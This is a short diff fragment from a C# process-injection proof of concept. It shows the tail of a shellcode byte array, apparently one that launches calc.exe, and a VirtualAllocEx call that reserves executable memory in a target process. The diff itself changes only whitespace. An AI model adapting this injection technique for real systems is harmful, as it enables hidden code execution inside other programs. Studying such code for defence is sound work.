@@ -72,7 +72,7 @@ public class InjectionPoC
 0x63,0x2e,0x65,0x78,0x65,0x00 };
 
 		// Convert shellcode string to byte array
-		
+
 
 		// Allocate a memory space in target process, big enough to store the shellcode
 		IntPtr memory_allocation_variable = VirtualAllocEx(process_handle, IntPtr.Zero, (uint)(shellcode.Length), 0x00001000, 0x40);
